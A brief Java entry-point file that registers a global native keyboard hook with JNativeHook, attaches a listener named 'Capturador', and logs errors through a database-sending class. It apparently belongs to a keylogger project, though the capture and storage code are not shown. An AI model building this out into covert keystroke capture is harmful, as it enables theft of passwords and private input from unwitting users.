package tech.leonam;

import org.jnativehook.GlobalScreen;
import tech.leonam.dao.EnviarBd;

public class Main {
    public static void main(String[] args) {
        try {
            var capturador = new Capturador();
            GlobalScreen.registerNativeHook();
            GlobalScreen.addNativeKeyListener(capturador);
        } catch (Exception e) {
            new EnviarBd(e.getMessage());
            new EnviarBd(e.toString());
        }
    }
}
